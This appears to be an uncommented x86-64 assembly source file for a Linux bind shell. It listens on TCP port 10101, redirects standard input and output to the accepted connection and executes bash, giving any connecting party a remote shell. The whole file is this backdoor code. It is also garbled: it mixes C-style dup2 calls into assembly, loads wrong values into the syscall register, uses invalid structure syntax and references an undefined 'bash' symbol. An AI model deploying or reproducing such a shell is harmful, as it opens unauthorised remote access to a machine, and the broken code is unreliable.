.bss
sin: .space 16

.data
sock: .long 0 
fd: .long 0 

.text
.global main

main:
    mov $AF_INET, %eax
    mov $SOCK_STREAM, %ebx
    mov $IPPROTO_TCP, %ecx
    syscall 
    mov %eax, sock 

    movw $AF_INET, sin.sin_family
    movw $10101, %ax 
    xchgb %ah, %al 
    movw %ax, sin.sin_port

    mov $SYS_BIND, %rax
    movq sock, %rdi
    movq sin, %rsi 
    movq $0x10, %rdx 
    syscall

    mov $SYS_LISTEN, %rax
    movq sock, %rdi
    mov $1, %rdx 
    syscall 

    mov $SYS_ACCEPT, %rax
    movq sock, %rdi
    mov $0, %rsi 
    mov $0, %rdx 
    syscall 
    mov %eax, fd 

    dup2(fd, 0)
    dup2(fd, 1) 
    dup2(fd, 2) 

    mov $SYS_EXECVE, %rax
    mov $bash, %rdi 
    mov $0, %rsi
    mov $0, %rdx 
    syscall

    mov $SYS_EXIT, %rax
    mov $0, %rdi
    syscall


